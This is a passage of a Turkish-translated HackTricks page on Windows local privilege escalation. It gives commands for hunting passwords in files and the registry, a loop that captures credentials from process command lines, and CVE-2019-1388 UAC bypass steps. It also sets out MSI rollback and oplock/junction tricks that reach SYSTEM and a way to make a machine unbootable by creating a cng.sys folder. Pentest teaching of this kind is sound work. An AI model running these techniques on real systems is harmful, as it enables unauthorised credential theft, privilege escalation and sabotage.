- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM), Windows işletim sistemi içinde bulunan ve farklı dillerde yazılmış yazılım bileşenlerinin birbirleriyle iletişim kurmasını sağlayan bir teknolojidir. Her COM bileşeni class ID (CLSID) ile tanımlanır ve her bileşen bir veya daha fazla arayüz aracılığıyla fonksiyonellik sunar; bu arayüzler interface ID (IIDs) ile tanımlanır.

COM sınıfları ve arayüzleri registry altında **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur = **HKEY\CLASSES\ROOT.**

Bu registry içindeki CLSID'lerin içinde, bir DLL'e işaret eden bir **default value** içeren ve **ThreadingModel** adlı bir değere sahip child registry **InProcServer32** bulunur; ThreadingModel değeri **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) veya **Neutral** (Thread Neutral) olabilir.

![](<../../images/image (729).png>)

Temelde, çalıştırılacak DLL'lerin herhangi birini overwrite edebilirseniz, o DLL farklı bir kullanıcı tarafından çalıştırılacaksa, you could escalate privileges.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip dosyayı arayın**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt Defterinde anahtar adlarını ve parolaları ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Şifre arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Bu eklentiyi hedef içinde credentials arayan tüm metasploit POST module'lerini otomatik olarak çalıştırmak için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen passwords içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) sistemden password çıkarmak için başka harika bir araçtır.

Araç [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) açık metin olarak bu verileri kaydeden çeşitli araçların **sessions**, **usernames** ve **passwords**'larını arar (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Düşünün ki **SYSTEM olarak çalışan bir süreç** `OpenProcess()` ile **tam erişime** sahip yeni bir süreç açıyor. Aynı süreç `CreateProcess()` ile **düşük ayrıcalıklara sahip ancak ana sürecin açık tüm handle'larını devralan** yeni bir süreç de oluşturuyor.\
Sonra, eğer düşük ayrıcalıklı sürece **tam erişiminiz** varsa, `OpenProcess()` ile oluşturulmuş ayrıcalıklı sürecin açık handle'ını ele geçirip **shellcode enjekte edebilirsiniz**.\
[Bu örneği, **bu zayıflığın nasıl tespit edileceği ve sömürüleceği** hakkında daha fazla bilgi için okuyun.](leaked-handle-exploitation.md)\
[Farklı izin seviyeleriyle devralınan süreç ve thread'lerin daha fazla açık handle'ını test etme ve kötüye kullanma (yalnızca tam erişim değil) konusunda daha kapsamlı bir açıklama için **bu diğer yazıyı** okuyun.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

Paylaşılan bellek segmentleri, **pipes** olarak adlandırılan, süreçler arası iletişim ve veri aktarımına olanak sağlar.

Windows, ilgisiz süreçlerin bile veri paylaşmasına izin veren **Named Pipes** adlı bir özellik sunar; bu farklı ağlar üzerinden bile olabilir. Bu, rolü **named pipe server** ve **named pipe client** olarak tanımlanan bir client/server mimarisine benzer.

Bir **client** tarafından bir pipe üzerinden veri gönderildiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** yetkisine sahipse **client'in kimliğini üstlenme** yeteneğine sahiptir. İmitasyonunu yapabileceğiniz bir pipe aracılığıyla iletişim kuran **ayrıcalıklı bir süreci** tespit etmek, sizin kurduğunuz pipe ile etkileşime geçtiğinde o sürecin kimliğini üstlenerek **daha yüksek ayrıcalıklar elde etme** fırsatı verir. Böyle bir saldırıyı gerçekleştirmek için talimatlar [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulunabilir.

Ayrıca aşağıdaki araç, burp gibi bir araçla named pipe iletişimini **intercept** etmenizi sağlar: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) ve bu araç, privescs bulmak için tüm pipe'ları listelemenizi ve görmenizi sağlar: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Çeşitli

### Windows'ta bir şeyler çalıştırabilecek dosya uzantıları

Sayfaya göz atın: **[https://filesec.io/](https://filesec.io/)**

### **Komut Satırlarındaki Parolaları İzleme**

Kullanıcı olarak bir shell elde ettiğinizde, zamanlanmış görevler veya komut satırı üzerinden kimlik bilgileri ileten diğer süreçler çalışıyor olabilir. Aşağıdaki script, süreçlerin komut satırlarını her iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktı olarak verir.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## İşlemlerden şifre çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Eğer konsol veya RDP üzerinden grafik arayüze erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde ayrıcalıksız bir kullanıcıdan "NT\AUTHORITY SYSTEM" gibi bir terminali veya başka herhangi bir işlemi çalıştırmak mümkün olabilir.

Bu, aynı güvenlik açığıyla aynı anda yetki yükseltmeyi ve UAC'i atlamayı mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen bazı sistemler şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu güvenlik açığını istismar etmek için aşağıdaki adımların uygulanması gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Integrity Levels hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Sonra UAC ve UAC bypasses hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Teknik [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) içinde açıklanmıştır ve exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) mevcuttur.

Saldırı temelde Windows Installer'ın rollback özelliğini, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı olanlarla değiştirmek için kötüye kullanmaktan ibarettir. Bunun için saldırgan, `C:\Config.Msi` klasörünü hijack etmek üzere kullanılacak **malicious MSI installer** oluşturmalıdır; bu klasör daha sonra diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için Windows Installer tarafından kullanılacaktır ve rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilmiş olacaktır.

Özet teknik şu şekildedir:

1. **Aşama 1 – Ele Geçirmeye Hazırlık (`C:\Config.Msi`'yi boş bırakın)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback yedekleri).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Ana MSI rollback tekniği (öncekiler) tüm bir klasörü (ör. `C:\Config.Msi`) silebileceğinizi varsayar. Peki ya zafiyetiniz sadece arbitrary file deletion izni veriyorsa?

NTFS iç yapılarını suistimal edebilirsiniz: her klasörün şu isimli gizli bir alternate data stream'i vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **indeks meta verisini** depolar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS **tüm klasörü** dosya sisteminden kaldırır.

Bunu şu gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* delete API çağırıyor olsanız bile, bu **deletes the folder itself**.

### Folder Contents Delete'den SYSTEM EoP'ye
Peki ya primitive'iniz delete arbitrary files/folders yapmanıza izin vermiyorsa, ancak **saldırgan kontrollü bir folder'ın *contents*'unu silmeye izin veriyorsa**?

1. Adım 1: Tuzak bir folder ve file oluşturun
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerinde bir **oplock** yerleştirin
- Bu **oplock**, ayrıcalıklı bir işlem `file1.txt`'i delete etmeye çalıştığında **yürütmeyi duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM sürecini tetikle (örn., `SilentCleanup`)
- Bu süreç klasörleri tarar (örn., `%TEMP%`) ve içindekileri silmeye çalışır.
- `file1.txt`'e ulaştığında, **oplock tetiklenir** ve kontrolü callback'inize verir.

4. Adım 4: Oplock callback içinde – silme işlemini yönlendir

- Seçenek A: `file1.txt`'i başka bir yere taşı
- Bu, oplock'u bozmadan `folder1`'i boşaltır.
- `file1.txt`'i doğrudan silmeyin — bu oplock'u erken serbest bırakır.

- Seçenek B: `folder1`'i bir **junction**'a dönüştür:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör metadata'sını depolayan NTFS iç akışını hedef alır — onu silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırak
- SYSTEM işlemi devam eder ve `file1.txt`'i silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle, aslında şunu siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Arbitrary Folder Create'den Permanent DoS'ye

Bir primitive'i istismar edin; bu size **create an arbitrary folder as SYSTEM/admin** yapma imkanı verir — hatta **dosya yazamıyor olsanız** veya **zayıf izinler ayarlayamıyor olsanız** bile.

Kritik bir Windows sürücüsünün adıyla bir **klasör** (dosya değil) oluşturun, örn.:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` çekirdek modunda sürücüsüne karşılık gelir.
- Eğer bunu **önceden bir klasör olarak oluşturursanız**, Windows önyükleme sırasında gerçek sürücüyü yükleyemez.
- Sonra, Windows önyükleme sırasında `cng.sys` yüklemeye çalışır.
- Klasörü gördüğünde, **gerçek sürücüyü çözümlerken başarısız olur** ve **çöker veya önyüklemeyi durdurur**.
- Dış müdahale olmadan (örn. önyükleme onarımı veya disk erişimi) **geri dönüş yoktur** ve **kurtarma mümkün değildir**.


## **From High Integrity to System**

### **Yeni servis**

Eğer zaten High Integrity bir süreçte çalışıyorsanız, **SYSTEM'e erişim** sadece yeni bir servis **oluşturup çalıştırmak** kadar kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; aksi takdirde geçerli bir service değilse 20s içinde sonlandırılacaktır.

### AlwaysInstallElevated

High Integrity process'ten AlwaysInstallElevated registry entries'ı enable etmeyi deneyebilir ve bir reverse shell'i _**.msi**_ wrapper kullanarak **install** edebilirsiniz.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Şunu yapabilirsiniz** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen zaten High Integrity bir process'te bulursunuz), SeDebug ayrıcalığıyla neredeyse herhangi bir process'i (protected processes olmayan) open edebilir, ilgili process'in token'ını copy edebilir ve o token ile arbitrary bir process create edebilirsiniz.\
Bu teknikte genellikle SYSTEM olarak çalışan ve tüm token ayrıcalıklarına sahip herhangi bir process seçilir (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Bir örneğini** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### Named Pipes

Bu teknik meterpreter tarafından `getsystem`'de yükselmek için kullanılır. Teknik, **bir pipe oluşturup ardından o pipe'a yazması için bir service oluşturmak/istismar etmek**ten oluşur. Ardından pipe'ı oluşturan **server**, **`SeImpersonate`** ayrıcalığını kullanarak pipe client'ının (service'in) token'ını **impersonate** edebilecek ve SYSTEM ayrıcalıklarını elde edecektir.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer SYSTEM olarak çalışan bir process tarafından load edilen bir dll'i **hijack** etmeyi başarırsanız, bu izinlerle arbitrary kod çalıştırabilirsiniz. Bu sebeple Dll Hijacking bu tür privilege escalation için de faydalıdır ve ayrıca high integrity process'ten **başarması çok daha kolaydır**, çünkü dll'lerin yüklendiği klasörler üzerinde **write permissions** olacaktır.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- https://github.com/sailay1996/RpcSsImpersonator
- https://decoder.cloud/2020/05/04/from-network-service-to-system/
- https://github.com/decoder-it/NetworkServiceExploit

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmalar ve hassas dosyalar için kontrol eder (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır. Localde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain üzerinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı ADIDNS/LLMNR/mDNS/NBNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Bilinen privesc zayıflıklarını arar (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekiyor)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zayıflıklarını arar (VisualStudio ile compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Host'u yanlış yapılandırmalar için tarar (daha çok bilgi toplama aracı, privesc'den ziyade) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Yanlış yapılandırmaları kontrol eder (exe github'da önceden derlenmiş). Tavsiye edilmez. Win10'da iyi çalışmıyor.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Tavsiye edilmez. Win10'da iyi çalışmıyor.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (proper çalışması için accesschk'e ihtiyaç duymaz fakat kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümü kullanarak derlemeniz gerekir ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Hedef hostta yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
